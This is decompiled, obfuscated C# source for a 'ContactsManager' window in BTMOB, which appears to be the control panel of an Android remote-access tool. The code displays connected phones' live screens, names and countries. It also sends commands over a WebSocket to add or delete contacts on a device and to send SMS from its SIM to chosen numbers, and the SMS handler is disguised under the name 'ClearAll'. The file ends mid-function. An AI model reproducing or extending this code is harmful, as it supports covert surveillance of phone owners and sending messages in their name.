using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class ContactsManager : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAllToolStripMenuItem")]
	private ToolStripMenuItem _ClearAllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addnumbtn")]
	private DrakeUIButtonIcon _addnumbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("emptysearch")]
	private DrakeUIButtonIcon _emptysearch;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	public BTClient Btcli;

	public virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numculm")]
	internal virtual DataGridViewTextBoxColumn numculm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acctclum")]
	internal virtual DataGridViewTextBoxColumn acctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxcont")]
	internal virtual ContextMenuStrip ctxcont
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ClearAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAllToolStripMenuItem = value;
			toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem1 = value;
			toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon addnumbtn
	{
		[CompilerGenerated]
		get
		{
			return _addnumbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addnumbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addnumbtn = value;
			drakeUIButtonIcon = _addnumbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon emptysearch
	{
		[CompilerGenerated]
		get
		{
			return _emptysearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = emptysearch_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_emptysearch = value;
			drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.ContactsManager));
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.numculm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.acctclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ctxcont = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ClearAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.addnumbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.emptysearch = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctxcont.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(659, 5);
		this.minibtn.Location = new System.Drawing.Point(701, 5);
		this.closbtn.Location = new System.Drawing.Point(743, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(775, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(785, 26);
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._15185478, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.numnamclm, this.numculm, this.acctclum);
		this.DGV0.ContextMenuStrip = this.ctxcont;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._15185478, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.Location = new System.Drawing.Point(9, 9);
		this.DGV0.MultiSelect = false;
		this.DGV0.Name = EXGuarder._03103558;
		this.DGV0.ReadOnly = true;
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._15185478, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.RowTemplate.Height = 24;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(767, 528);
		this.DGV0.TabIndex = 40;
		this.numnamclm.HeaderText = EXGuarder._183E041F;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._0D455C32;
		this.numnamclm.ReadOnly = true;
		this.numculm.HeaderText = EXGuarder._6C715800;
		this.numculm.MinimumWidth = 6;
		this.numculm.Name = EXGuarder._6C6B3136;
		this.numculm.ReadOnly = true;
		this.acctclum.HeaderText = EXGuarder._3D0F460E;
		this.acctclum.MinimumWidth = 6;
		this.acctclum.Name = EXGuarder._7330782F;
		this.acctclum.ReadOnly = true;
		this.ctxcont.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxcont.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripMenuItem1, this.ClearAllToolStripMenuItem });
		this.ctxcont.Name = EXGuarder._4352505D;
		this.ctxcont.Size = new System.Drawing.Size(178, 52);
		this.ToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem1.Name = EXGuarder._724D3A1A;
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(177, 24);
		this.ToolStripMenuItem1.Text = EXGuarder._20740E4F;
		this.ClearAllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ClearAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ClearAllToolStripMenuItem.Name = EXGuarder._2506352D;
		this.ClearAllToolStripMenuItem.Size = new System.Drawing.Size(177, 24);
		this.ClearAllToolStripMenuItem.Text = EXGuarder._49396F49;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.DGV0);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(2, 109);
		this.Panel3.Name = EXGuarder._613D350E;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(785, 546);
		this.Panel3.TabIndex = 55;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.addnumbtn);
		this.Panel2.Controls.Add(this.emptysearch);
		this.Panel2.Controls.Add(this.searchtext);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._290F3C07;
		this.Panel2.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel2.Size = new System.Drawing.Size(785, 45);
		this.Panel2.TabIndex = 55;
		this.addnumbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addnumbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.addnumbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnumbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.addnumbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnumbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnumbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnumbtn.Font = new System.Drawing.Font(EXGuarder._15185478, 9f);
		this.addnumbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnumbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnumbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnumbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnumbtn.Location = new System.Drawing.Point(10, 9);
		this.addnumbtn.Name = EXGuarder._2E6E281F;
		this.addnumbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnumbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.addnumbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnumbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnumbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.addnumbtn.Size = new System.Drawing.Size(148, 27);
		this.addnumbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addnumbtn.Symbol = 61543;
		this.addnumbtn.SymbolSize = 20;
		this.addnumbtn.TabIndex = 47;
		this.addnumbtn.Text = EXGuarder._135F3E59;
		this.emptysearch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.emptysearch.Dock = System.Windows.Forms.DockStyle.Right;
		this.emptysearch.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.Font = new System.Drawing.Font(EXGuarder._15185478, 9f);
		this.emptysearch.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.emptysearch.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.emptysearch.Location = new System.Drawing.Point(529, 9);
		this.emptysearch.Name = EXGuarder._3D371F5F;
		this.emptysearch.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.emptysearch.RectColor = System.Drawing.Color.Gray;
		this.emptysearch.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.emptysearch.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.emptysearch.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.emptysearch.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.emptysearch.Size = new System.Drawing.Size(40, 27);
		this.emptysearch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.emptysearch.Symbol = 77;
		this.emptysearch.SymbolSize = 25;
		this.emptysearch.TabIndex = 14;
		this.emptysearch.Visible = false;
		this.searchtext.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Right;
		this.searchtext.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.Font = new System.Drawing.Font(EXGuarder._15185478, 9f, System.Drawing.FontStyle.Bold);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(569, 9);
		this.searchtext.Margin = new System.Windows.Forms.Padding(4);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = EXGuarder._5A162428;
		this.searchtext.Padding = new System.Windows.Forms.Padding(4);
		this.searchtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(206, 25);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.TabIndex = 13;
		this.searchtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.searchtext.Watermark = EXGuarder._786C3662;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(789, 657);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._46457360);
		base.Name = EXGuarder._39283427;
		this.Text = EXGuarder._6A491809;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctxcont.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public ContactsManager()
	{
		base.Load += ContactsManager_Load;
		base.FormClosing += ContactsManager_FormClosing;
		InitializeComponent();
	}

	private void ContactsManager_Load(object sender, EventArgs e)
	{
		codes.SetDoubleBuffered(DGV0);
		ctxcont.Renderer = new MyRenderer();
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		statetimer.Start();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Contactsstr + EXGuarder._2D592268 + Btcli.name + EXGuarder._2D592268 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Contactsstr + EXGuarder._2D592268 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void ContactsManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
	}

	private void searchtext_TextChanged(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(searchtext.Text))
		{
			emptysearch.Visible = true;
			trysearch();
		}
		else
		{
			emptysearch.Visible = false;
			ShowAllRows();
		}
	}

	public void trysearch()
	{
		if (DGV0.Rows.Count < 1 || string.IsNullOrEmpty(searchtext.Text))
		{
			return;
		}
		string value = searchtext.Text.ToLower();
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			try
			{
				if (item.Cells[0].Value.ToString().ToLower().Contains(value) || item.Cells[1].Value.ToString().ToLower().Contains(value) || item.Cells[2].Value.ToString().ToLower().Contains(value))
				{
					item.Visible = true;
				}
				else
				{
					item.Visible = false;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ShowAllRows()
	{
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			item.Visible = true;
		}
	}

	private void emptysearch_Click(object sender, EventArgs e)
	{
		searchtext.Text = EXGuarder._6E483A59;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._78784A0A;
		myinputs2.inputtext.Text = EXGuarder._0F1A414C;
		myinputs2.inputtext2.Text = EXGuarder._0F1A414C;
		myinputs2.inputtext2.Visible = true;
		myinputs2.checkfolder.Visible = false;
		myinputs2.inputtext.Watermark = EXGuarder._042C7731;
		myinputs2.inputtext2.Watermark = EXGuarder._76184156;
		if (myinputs2.ShowDialog() == DialogResult.OK)
		{
			string text = myinputs2.inputtext.Text;
			string text2 = myinputs2.inputtext2.Text;
			if (codes.StrisEmpty(text))
			{
				BTAlerter.infos(EXGuarder._39277126);
				return;
			}
			if (codes.StrisEmpty(text2))
			{
				BTAlerter.infos(EXGuarder._46244528);
				return;
			}
			VB_0024AnonymousType_17<string, string, string> data = new VB_0024AnonymousType_17<string, string, string>(EXGuarder._332E1567, text, text2);
			string value = BTCommand.FormatCommand(EXGuarder._5F252909, data);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._1069640D, BTConst.wrk);
			dictionary.Add(EXGuarder._445F0947, value);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string numid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_18<string, string> data = new VB_0024AnonymousType_18<string, string>(EXGuarder._3E325E1C, numid);
				string value = BTCommand.FormatCommand(EXGuarder._6D617664, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._34365829, BTConst.wrk);
				dictionary.Add(EXGuarder._42396F20, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		SMSmaker sMSmaker = new SMSmaker();
		if (Btcli.sim.Contains(EXGuarder._0A4E2C12))
		{
			string[] array = Btcli.sim.Split('/');
			string[] array2 = array;
			foreach (string item in array2)
			{
				sMSmaker.combosims.Items.Add(item);
			}
		}
		sMSmaker.myico.Image = Btcli.wallpaper;
		sMSmaker.mytitle.Text = BTConst.uploadingstr + EXGuarder._0F3E7452 + Btcli.name + EXGuarder._0F3E7452 + Btcli.country;
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string item2 = selectedRow.Cells[1].Value.ToString();
				sMSmaker.numslist.Items.Add(item2);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		if (sMSmaker.ShowDialog() != DialogResult.OK || sMSmaker.numslist.Items.Count <= 0)
		{
			return;
		}
		string mmssge = sMSmaker.msgtext.Text;
		string _6F = EXGuarder._6F262471;
		if (Operators.CompareString(sMSmaker.combosims.Text, EXGuarder._5A765B5A, TextCompare: false) != 0)
		{
			_6F = sMSmaker.combosims.Text;
		}
		checked
		{
			int num = sMSmaker.numslist.Items.Count - 1;
			for (int j = 0; j <= num; j++)
			{
				string text = Conversions.ToString(sMSmaker.numslist.Items[j]);
				if (!(string.IsNullOrEmpty(text) | string.IsNullOrWhiteSpace(text)))
				{
					VB_0024AnonymousType_19<string, string, string, string> data = new VB_0024AnonymousType_19<string, string, string, string>(EXGuarder._4A464F4B, mmssge, _6F, text);
					string value = BTCommand.FormatCommand(EXGuarder._26373F27, data);
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._743D5712, BTConst.wrk);
					dictionary.Add(EXGuarder._16081E1C, value);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
				}
			}
		}
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGV0.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
